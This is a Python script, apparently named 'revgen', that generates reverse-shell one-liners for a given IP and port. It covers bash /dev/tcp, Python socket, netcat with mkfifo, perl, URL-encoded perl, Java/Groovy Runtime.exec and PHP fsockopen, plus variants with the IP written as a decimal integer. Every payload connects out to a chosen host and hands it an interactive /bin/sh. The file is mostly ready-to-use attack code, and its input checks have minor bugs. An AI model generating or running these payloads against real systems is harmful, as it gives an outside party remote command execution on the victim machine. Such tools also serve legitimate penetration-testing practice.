import socket
import ipaddress
import argparse
import sys
###VARIABLES AND STUFF
reverse = ('all','bash','python','mk','java','perl','echo')
   
##########################
##########################
ol = {}
def onel(ip,port,long):
    ol["bash"] = [f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',f'bash -i >& /dev/tcp/{long}/{port} 0>&1']
    ol["python"] = [f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{long}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]
    ol["mk"] = [f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {long} {port} >/tmp/f']
    ol["echo"] = [f'echo%20%27use%20Socket%3B%24i%3D%22{ip}%22%3B%24p%3D{port}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew',f'echo%20%27use%20Socket%3B%24i%3D%22{long}%22%3B%24p%3D{port}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew']
    ol["perl"] = [f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'', f'perl -e \'use Socket;$i="{long}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'']
    ol["java"] = [f'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();',f'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{long}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();']
    ol["php"] = [f'php -r \'$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'' , f'php -r \'$sock=fsockopen(\"{long}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'']

##########################
##########################
 
def rev(ip,port,w='all'):
###
###
###longa!!!
    long = int(ipaddress.IPv4Address(ip))
    onel(ip,port,long)
    if (w == 'all'):
        for k, v in ol.items():
            for i in v:
                print(i)
    else:
        for k, v in ol.items():
            if (k==w):
                for i in v:
                    print(i)

##chek if port number is valid
def chk_port(port=""):
    chk=False
    while chk is False:
        try:
            if (port == "") or (port==None):
                port= int(input("PORT: "))
            assert 0 < int(port) < 65535
        except ValueError:
            print('It\'s not a valid port number, sorry! try again')
            port= input("PORT: ")
            port = chk_port(port)
        except AssertionError:
            print('It\'s not a valid port number, sorry! try again')
        return port
    chk=True
    return port     
       
#check if ip is valid
def chk_ip(ip=""):
    chk=False
    while chk is False:
        try:
            if (ip == "") or (ip==None) or (len(ip) == 0):
                ip = input("IP: ")
            ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            print("Hey!thats's not how IP addres looks like. Try harder")
            ip = input("IP: ")
            ip = chk_ip(ip)
        return ip 
    chk=True
    return ip               
                  
    
def chk_type(type=""):
    chk=False
    while chk is False:
        try:
            if (ip == "") or (ip==None) or (len(ip) == 0):
                print(f"Choose wisely: {reverse}")
                type = input("TYPE: ")
            assert type in reverse
        except ValueError:
            print(f"Choose wisely: {reverse}")
            type= input("TYPE: ")
            chk_type(type)
        except AssertionError:
            print(f"Choose wisely: {reverse}")    
            type= input("TYPE: ")
            chk_type(type)
        return type
    chk=True
    return type    


#starter
if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='revgen',description='You gimme an IP with PORT numba and You get oneliner.', epilog='Have fun!')
    parser.add_argument("-w",type=str, help='revgen.py -w php -ip IP:PORT')
    parser.add_argument("-ip", type=str, help='revgen.py -ip IP:PORT')
    args = parser.parse_args()
    ip = args.ip
    ipa = False
    ##catch wrong input 
    try: 
        ip,port = ip.split(":")
    except ValueError:
        ip = chk_ip(ip)
        ipa = True
        port=""
    except AttributeError:
        ip = chk_ip(ip)
        port = chk_port()
        if args.w is None or args.w=="":
            w = args.w
            w=chk_type(w)
        else:
            w="all"
        rev(ip,port,w)
    ## -ip IP:PORT 
    if (args.ip) and (args.w == None):
        if ipa == False :
            ip = chk_ip(ip)
        port = chk_port()       
        rev(ip,port)
        
    
    ## -w TYPE IP:PORT
    if args.ip and args.w:
        w = chk_type(args.w)       
        if ipa == False :
            ip = chk_ip(ip)
        port = chk_port(port)
        rev(ip,port,w)
    if (args == None):
        w = chk_type()
        ip = chk_ip()
        port = chk_port()